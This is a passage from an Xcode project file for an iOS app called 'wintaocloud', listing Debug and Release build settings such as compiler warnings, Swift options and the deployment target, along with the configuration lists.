				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = ll.wentao.ald;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		739A48572ECAF08D00E3A18E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		739A48582ECAF08D00E3A18E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		739A483C2ECAF08C00E3A18E /* Build configuration list for PBXProject "wintaocloud" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				739A48572ECAF08D00E3A18E /* Debug */,
				739A48582ECAF08D00E3A18E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		739A48542ECAF08D00E3A18E /* Build configuration list for PBXNativeTarget "wintaocloud" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				739A48552ECAF08D00E3A18E /* Debug */,
				739A48562ECAF08D00E3A18E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 739A48392ECAF08C00E3A18E /* Project object */;
}
